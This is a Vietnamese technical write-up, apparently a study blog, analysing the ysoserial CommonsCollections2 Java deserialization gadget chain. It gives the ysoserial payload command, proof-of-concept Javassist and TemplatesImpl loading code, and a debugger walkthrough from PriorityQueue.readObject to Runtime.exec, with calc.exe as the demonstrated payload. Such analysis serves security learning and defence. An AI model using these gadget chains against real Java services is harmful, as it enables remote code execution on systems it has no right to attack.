<p><code>java -jar ysoserial-all.jar CommonsCollections2 &quot;calc.exe&quot; | base64 -w0</code></p>
<p>Các gadget chain của payloay:</p>
<pre><code>/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
</code></pre><p>project.iml</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;module type=&quot;JAVA_MODULE&quot; version=&quot;4&quot;&gt;
  &lt;component name=&quot;NewModuleRootManager&quot; inherit-compiler-output=&quot;true&quot;&gt;
    &lt;exclude-output /&gt;
    &lt;content url=&quot;file://$MODULE_DIR$&quot;&gt;
      &lt;sourceFolder url=&quot;file://$MODULE_DIR$/src&quot; isTestSource=&quot;false&quot; /&gt;
    &lt;/content&gt;
    &lt;orderEntry type=&quot;jdk&quot; jdkName=&quot;1.8&quot; jdkType=&quot;JavaSDK&quot; /&gt;
    &lt;orderEntry type=&quot;sourceFolder&quot; forTests=&quot;false&quot; /&gt;
    &lt;orderEntry type=&quot;library&quot; name=&quot;commons-collections4-4.0&quot; level=&quot;project&quot; /&gt;
  &lt;/component&gt;
&lt;/module&gt;
</code></pre><p>Mình đã test thử các phiên bản jdk thì có bản 1.7 trở xuống bảng 1.9 trở lên cho đến các bản jdk 11 và mình có test jdk 19, 21, 22 thì không thể thực hiện được deserialize với gadget này</p>
<p>Trước khi đi vào phân tích ta sẽ đi qua một số thông tin qua 1 số concept -&gt; ClassLoader#defineClass, TemplatesImpl, Javasist.</p>
<h3 id="javasist-java-programming-assistant">Javasist( Java programming Assistant)</h3>
<p>thông tường ta sẽ compile .java thành .class để chạy java -&gt; sử dụng javac để compile bằng command line -&gt; sử dụng bytecode (.class) được gen bởi compilaration để chạy trên JVM -&gt; mỗi class này chứa java class và interface</p>
<p>Javasist là một thư viện để sử lí bytecode -&gt; có thể chỉnh sửa byte code của file class.</p>
<p>các method thường được dùng:
ClassPool là một container của CtClass objects từ đó có thể lấy được CtClass, bằng các gọi đến ClassPool.getDefault().</p>
<p><img src="https://hackmd.io/_uploads/Sy4wTTG6C.png" alt="image"></p>
<p>pool có kiểu class là ClassPool được gán giá trị là ClassPool.getDefault();</p>
<p>Có thể thấy method này như sau:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kd">synchronized</span> <span class="n">ClassPool</span> <span class="nf">getDefault</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">defaultPool</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">defaultPool</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassPool</span><span class="o">((</span><span class="n">ClassPool</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
            <span class="n">defaultPool</span><span class="o">.</span><span class="na">appendSystemPath</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">defaultPool</span><span class="o">;</span>
    <span class="o">}</span>
</code></pre></div><p>nó sẽ tạo một classPool mới -&gt; gọi appenSytemPath() sau đó trả ra obj này -&gt; do đó nó sẽ trả về một default classPool vì nó truyền tham số là null -&gt; nó sẽ tìm những system class path là đường dẫn đến các object trong thư mục</p>
<p><img src="https://hackmd.io/_uploads/BySRJ0faC.png" alt="image"></p>
<p>-&gt; theo sau đó mình cung cấp class path của object hiện tại cho nó, nếu mà server chạy trên Jboss hoặc tomcat của user thông thường thì chương tringh sẽ không tìm thấy nó và chúng ta cần phải dùng <code>pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</code> để nó có thấy xác định chính xác</p>
<p><code>CtClass EvilClass = pool.makeClass(&quot;Evil&quot;);</code> tạo một class có tên là Evil -&gt; nó sẽ kế thừa các thuộc tính <code> EvilClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</code> -&gt; tạo một static contructor <code>CtConstructor constructor = test.makeClassInitializer();</code></p>
<p>Insert byte code ở begin của class <code>constructor.insertBefore(&quot;System.out.println(\&quot;Hello,Javasist\&quot;);&quot;);</code></p>
<p>Sau khi chạy thì sẽ tạo một class là Evil ở classpath</p>
<p><img src="https://hackmd.io/_uploads/HyqvZ0zpR.png" alt="image"></p>
<p>Vậy chúng ta có thể viết class mới -&gt; vậy làm sao để có thể gọi và chạy nó theo ý của ta. Câu trả lời ở dưới -&gt;</p>
<h3 id="classloaderdefineclass">ClassLoader#defineClass</h3>
<p>ClassLoader::defineClass có thể chạy một class từ mảng bytes</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">protected</span> <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">defineClass</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">b</span><span class="o">,</span> <span class="kt">int</span> <span class="n">off</span><span class="o">,</span> <span class="kt">int</span> <span class="n">len</span><span class="o">)</span>
        <span class="kd">throws</span> <span class="n">ClassFormatError</span>
    <span class="o">{</span>
        <span class="k">return</span> <span class="n">defineClass</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">b</span><span class="o">,</span> <span class="n">off</span><span class="o">,</span> <span class="n">len</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
    <span class="o">}</span>
</code></pre></div><p>vì đây là protected nên chúng ta cần phải sử dụng reflection api để access đến nó.</p>
<p><code>  Class getClass = Class.forName(&quot;java.lang.ClassLoader&quot;);//get Classloader</code> dùng class.forName để lấy ra classLoader</p>
<p>Lấy ra method <code> Method getMethod = getClass.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);//get method</code>  chuyển đổi access to private method là <code>getMethod.setAccessible(true);//access private method</code></p>
<p>Cuối cùng invoke class Evil <code>Class invoker = (Class) getMethod.invoke(ClassLoader.getSystemClassLoader(),&quot;Evil&quot;,bytes,0,bytes.length);</code> với các args và câu lệnh sẽ được chạy</p>
<p><img src="https://hackmd.io/_uploads/HyDvv0zTR.png" alt="image"></p>
<h3 id="templatesimpl">TemplatesImpl</h3>
<p>full path: <code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>;</p>
<p>Ta có thể thấy có class <code>TransletClassLoader</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"> <span class="kd">static</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">TransletClassLoader</span> <span class="kd">extends</span> <span class="n">ClassLoader</span> <span class="o">{</span>

        <span class="kd">private</span> <span class="kd">final</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">Class</span><span class="o">&gt;</span> <span class="n">_loadedExternalExtensionFunctions</span><span class="o">;</span>

        <span class="n">TransletClassLoader</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">parent</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">parent</span><span class="o">);</span>
            <span class="n">_loadedExternalExtensionFunctions</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="n">TransletClassLoader</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">parent</span><span class="o">,</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Class</span><span class="o">&gt;</span> <span class="n">mapEF</span><span class="o">)</span> <span class="o">{</span>
            <span class="kd">super</span><span class="o">(</span><span class="n">parent</span><span class="o">);</span>
            <span class="n">_loadedExternalExtensionFunctions</span> <span class="o">=</span> <span class="n">mapEF</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">loadClass</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
            <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">ret</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="c1">// The _loadedExternalExtensionFunctions will be empty when the
</span><span class="c1"></span>            <span class="c1">// SecurityManager is not set and the FSP is turned off
</span><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">_loadedExternalExtensionFunctions</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">ret</span> <span class="o">=</span> <span class="n">_loadedExternalExtensionFunctions</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">ret</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">ret</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="k">return</span> <span class="n">ret</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="cm">/**
</span><span class="cm">         * Access to final protected superclass member from outer class.
</span><span class="cm">         */</span>
        <span class="n">Class</span> <span class="nf">defineClass</span><span class="o">(</span><span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">b</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">defineClass</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">b</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">b</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div><p>ở đây thì có 1 class defineClass y hệt như cái ta nói ở trên -&gt; tương tự thì chúng ta sẽ có thể gọi đến defineClass như sau:</p>
<p><code>new TransletClassLoader(anyany.class.getClassLoader()).defineClass(bytes)</code></p>
<p><img src="https://hackmd.io/_uploads/r1_KP1mTR.png" alt="image"></p>
<p>Quan sát ở đây ra vẫn có defineClass nhưng mà của object class</p>
<pre><code> TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });
</code></pre><p>và mục đích ta cũng sẽ gọi đến method defineClass của gadget trên qua method defineClass của nó với tham số là _bytecode[i]</p>
<p>để ý đây là một private field của class TemplatesImpl do đó ta muốn access vào cần phải sử dụng java reflection. Nhưng trước tiên ta cần tìm gadget để gọi đến nó:</p>
<p>ở đây ta sẽ dùng:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="n">Translet</span> <span class="nf">getTransletInstance</span><span class="o">()</span>
        <span class="kd">throws</span> <span class="n">TransformerConfigurationException</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">_name</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>

            <span class="k">if</span> <span class="o">(</span><span class="n">_class</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="n">defineTransletClasses</span><span class="o">();</span>

            <span class="c1">// The translet needs to keep a reference to all its auxiliary
</span><span class="c1"></span>            <span class="c1">// class to prevent the GC from collecting them
</span><span class="c1"></span>            <span class="n">AbstractTranslet</span> <span class="n">translet</span> <span class="o">=</span> <span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">)</span> <span class="n">_class</span><span class="o">[</span><span class="n">_transletIndex</span><span class="o">].</span><span class="na">newInstance</span><span class="o">();</span>
            <span class="n">translet</span><span class="o">.</span><span class="na">postInitialization</span><span class="o">();</span>
            <span class="n">translet</span><span class="o">.</span><span class="na">setTemplates</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
            <span class="n">translet</span><span class="o">.</span><span class="na">setServicesMechnism</span><span class="o">(</span><span class="n">_useServicesMechanism</span><span class="o">);</span>
            <span class="n">translet</span><span class="o">.</span><span class="na">setAllowedProtocols</span><span class="o">(</span><span class="n">_accessExternalStylesheet</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">_auxClasses</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">translet</span><span class="o">.</span><span class="na">setAuxiliaryClasses</span><span class="o">(</span><span class="n">_auxClasses</span><span class="o">);</span>
            <span class="o">}</span>

            <span class="k">return</span> <span class="n">translet</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">catch</span> <span class="o">(</span><span class="n">InstantiationException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>
        <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">ErrorMsg</span> <span class="n">err</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ErrorMsg</span><span class="o">(</span><span class="n">ErrorMsg</span><span class="o">.</span><span class="na">TRANSLET_OBJECT_ERR</span><span class="o">,</span> <span class="n">_name</span><span class="o">);</span>
            <span class="k">throw</span> <span class="k">new</span> <span class="n">TransformerConfigurationException</span><span class="o">(</span><span class="n">err</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div><p>getTransletInstance cí method newwInstance sẽ match với source ta test ở trên -&gt; thực thi code trong evil class.</p>
<p>Điều kiện set _name != null và _class = null -&gt; ta dùng reflectAPI để set lại value cho chúng</p>
<p>Cuối cùng để trigger đến gadget trên thì ta cần dùng:</p>
<p><img src="https://hackmd.io/_uploads/BJqi9kQ60.png" alt="image"></p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.*</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.lang.reflect.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestClassLoader</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>

        <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
        <span class="n">CtClass</span> <span class="n">EvilClass</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">&#34;Evil&#34;</span><span class="o">);</span>

        <span class="n">EvilClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span>

        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">&#34;System.out.println(\&#34;aaaaaaaaaaaaaaa\&#34;);&#34;</span><span class="o">;</span>
        <span class="n">CtConstructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">EvilClass</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">();</span>
        <span class="n">constructor</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
        <span class="n">EvilClass</span><span class="o">.</span><span class="na">writeFile</span><span class="o">(</span><span class="s">&#34;./&#34;</span><span class="o">);</span>

        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">EvilClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

        <span class="n">TemplatesImpl</span> <span class="n">template</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>

        <span class="n">Class</span> <span class="n">temp</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">_name</span> <span class="o">=</span> <span class="n">temp</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;_name&#34;</span><span class="o">);</span>
        <span class="n">_name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">_name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">template</span><span class="o">,</span><span class="s">&#34;11111&#34;</span><span class="o">);</span>

        <span class="n">Field</span> <span class="n">_class</span> <span class="o">=</span> <span class="n">temp</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;_class&#34;</span><span class="o">);</span>
        <span class="n">_class</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">_class</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">template</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>

        <span class="n">Field</span> <span class="n">_bytecodes</span> <span class="o">=</span> <span class="n">temp</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;_bytecodes&#34;</span><span class="o">);</span>
        <span class="n">_bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">_bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">template</span><span class="o">,</span><span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>

        <span class="n">Field</span> <span class="n">_tfactory</span> <span class="o">=</span> <span class="n">temp</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;_tfactory&#34;</span><span class="o">);</span>
        <span class="n">_tfactory</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">_tfactory</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">template</span><span class="o">,</span><span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>

        <span class="n">template</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div><p>Về cơ bản thì đoạn mã này có công dụng là xác định đường dẫn của classpath như ta nói ở trên -&gt; để thêm class Evil vào đường dẫn này -&gt; và class evil sẽ có nội dung là in ra dòng chữ aaaaaaa -&gt; tiếp theo sẽ khởi tạo một object từ class <code>TemplatesImpl</code> -&gt; sau đó tải class TemplatesImpl ở thời điểm runtime để lợi dùng reflect api có thể truy vấn đến các method, biến của class này -&gt; do đó ta sẽ truy cập đến các trường, biến private trong class này các biến mà ta đề cập ở trên để có thể đến được các gadget là _name, _class, _bytecodes, _tfactory do những biến này đề là private cho nên phải dùng setAccessible(true) để có thể thay đổi giá trị của chúng -&gt; sau đó gọi newTransformer để access đến getTransletInstance để có thể kích hoạt gadget chain</p>
<p><img src="https://hackmd.io/_uploads/H1SU9HXp0.png" alt="image"></p>
<p>-&gt; bây giờ ta sẽ đi vào cụ thể gadget chain của cc2</p>
<p>*Đây là full chain của cc2:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">ObjectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
    <span class="n">PriorityQueue</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
    <span class="n">PriorityQueue</span><span class="o">.</span><span class="na">heapify</span><span class="o">()</span>
        <span class="n">PriorityQueue</span><span class="o">.</span><span class="na">siftDown</span><span class="o">()</span>
            <span class="n">PriorityQueue</span><span class="o">.</span><span class="na">siftDownUsingComparator</span><span class="o">()</span>
                <span class="n">TransformingComparator</span><span class="o">.</span><span class="na">compare</span><span class="o">()</span>
                    <span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">transform</span><span class="o">()</span>
                        <span class="n">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
                            <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">()</span>
                                <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getTransletInstance</span><span class="o">()</span>
                                <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">defineTransletClasses</span><span class="o">()</span>
                                    <span class="n">TransletClassLoader</span><span class="o">.</span><span class="na">defineClass</span><span class="o">()</span>
                                <span class="n">newInstance</span><span class="o">()</span>
                                    <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;calc.exe&#34;</span><span class="o">)</span>
</code></pre></div><p>Về cơ bản thì nó sẽ đi qua các method mà ta dùng ở trên</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="nf">Main</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">filename</span> <span class="o">=</span> <span class="s">&#34;src/cc2.bin&#34;</span><span class="o">;</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Reading file: &#34;</span> <span class="o">+</span> <span class="n">filename</span><span class="o">);</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="c1">// Đọc dữ liệu từ file cc2.bin
</span><span class="c1"></span>            <span class="n">FileInputStream</span> <span class="n">fileIn</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">filename</span><span class="o">);</span>
            <span class="n">ObjectInputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">fileIn</span><span class="o">);</span>
            <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
            <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="n">fileIn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Deserialized object: &#34;</span> <span class="o">+</span> <span class="n">obj</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="o">|</span> <span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div><p>Ta sẽ dùng hàm main cơ bản để đọc file bin từ payload được gen thay vì base64 như các trường hợp trên do 1 số bản cũ không hỗ trợ java.lang.utils cho base64 nên hơi bất tiện</p>
<p>cc2.bin là payload được đọc vào -&gt; tiến hành debug để đi vào gadget đầu tiên là <code>ObjectInputStream.readObject()</code> nó nằm ở trong hàm main của ta luôn <code>Object obj = in.readObject();</code></p>
<p><img src="https://hackmd.io/_uploads/H1DJW-GTC.png" alt="image"></p>
<p>Gía trị của enableOverride là false cho nên ta sẽ nhảy đến câu lệnh tiếp theo sau if.</p>
<p><img src="https://hackmd.io/_uploads/Hyt-GWMp0.png" alt="image"></p>
<p>passHandle có giá trị là 1 và outerHandler được gán bằng nó -&gt; đi vào khối lệnh try catch</p>
<p>try catch bắt lỗi cuối cùng gán:</p>
<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="n">passHandle</span> <span class="o">=</span> <span class="n">outerHandle</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">closed</span> <span class="o">&amp;&amp;</span> <span class="n">depth</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">clear</span><span class="o">();</span>
            <span class="o">}</span>
</code></pre></div><p>và gọi clear() -&gt; quay trở lại khối lệnh try lúc này passHandle có giá trị là 2</p>
<p><img src="https://hackmd.io/_uploads/ByEmnWfTA.png" alt="image"></p>
<p>handles được khởi tạo từ class HandleTable</p>
<p><code>handles = new HandleTable(10);</code></p>
<p>Về cơ bản thì method này sẽ nhận đầu vào của ta sau đó được deserialize thì nó sẽ đi trace tất cả các class trong lib của java</p>
<p>ở đây ta thấy payload có dùng source vào là:</p>
<p><img src="https://hackmd.io/_uploads/HJVw6SXpC.png" alt="image"></p>
<p>Vậy bắt đầu sẽ đi vào class <code>PriorityQueue</code> sau đó method readObject tại đây sẽ được gọi</p>
<p><img src="https://hackmd.io/_uploads/Sk0eCBmaA.png" alt="image"></p>
<p>Nó sẽ tạo một queue sau đó cuối dùng gọi method heapify()</p>
<p><img src="https://hackmd.io/_uploads/H1T8Cr7aR.png" alt="image"></p>
<p>ở đây sẽ duyệt 1 vòng for ngược lại mảng queue sau đó gọi method <code>siftDown</code> cho từng loop với args là từng phần tử queue.</p>
<p><img src="https://hackmd.io/_uploads/BJ6UJLXTR.png" alt="image"></p>
<p>Quan sát siftDown sẽ kiểm tra comparator nếu bằng null sẽ đi vào else -&gt; ta sẽ xem 2 source ở đây để tìm gadget tiếp theo</p>
<p><img src="https://hackmd.io/_uploads/BJyAkUX60.png" alt="image"></p>
<p>đây sẽ là method tiếp theo nhảy vào tức comparator sẽ khác null nó sẽ gọi <code>comparator.compare</code></p>
<p><img src="https://hackmd.io/_uploads/SkUNxUQaA.png" alt="image"></p>
<p>loop đầu right bằng size = 2 nên sẽ chạy vào <code>comparator.compare</code> ở dưới</p>
<p><img src="https://hackmd.io/_uploads/r1SKl8Q6R.png" alt="image"></p>
<p>tạo đây sẽ có 2 lần gọi transform với 2 object</p>
<p>cuối cùng sẽ gọi compare</p>
<p><img src="https://hackmd.io/_uploads/SyHRWI7T0.png" alt="image"></p>
<p>để ý 2 method <code>transform</code> này có nguồn từ <code>InvokerTransformer</code></p>
<p><img src="https://hackmd.io/_uploads/HJFKGImT0.png" alt="image"></p>
<p>Đây cũng là sink lead to RCE mà ta đã nói đến ở bài trước sẽ dùng invoke để gọi method mã ta access đến với tham số</p>
<p>public synchronized javax.xml.transform.Transformer com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer() throws javax.xml.transform.TransformerConfigurationException</p>
<p>Đây là method sau khi được khởi tạo là một method là newTransformer từ class TemplatesImpl ta cũng đã phân tích ở trên sau khi set lại các giá trị private từ nó -&gt; gọi đến <code>TemplatesImpl.getTransletInstance()</code>
-&gt; access đến method <code>TemplatesImpl.defineTransletClasses()</code></p>
<p>TemplatesImpl.defineTransletClasses()
TransletClassLoader.defineClass()
newInstance()
Runtime.getRuntime().exec(&ldquo;calc.exe&rdquo;)</p>
<p>Cuối cùng sẽ defineClass này:</p>
<p><img src="https://hackmd.io/_uploads/ryRBcUXaC.png" alt="image"></p>
<p>bytecodes là một mảng byte được gen bới Javassist  -&gt; khởi tạo một instane qua <code>getTransletInstance</code> tại <code> AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></p>
<p><img src="https://hackmd.io/_uploads/HyGbhI7aA.png" alt="image"></p>
<p>Tại đây có 2 class mới được khởi tạo:</p>
<p><img src="https://hackmd.io/_uploads/rJ4VhUmpC.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/r1qI2UmaC.png" alt="image"></p>
<p>Và ClassLoader sẽ gọi đến class đó và calc sẽ được pop up</p>
<p>2 lớp trên chỉ tồn tại trong JVM:</p>
<p>Do lớp này được tạo tại runtime và không ghi ra file, nó chỉ tồn tại trong bộ nhớ heap của JVM không giống như ví dụ ta làm.</p>
<p>Ví dụ về reflect api trong trường hợp:</p>
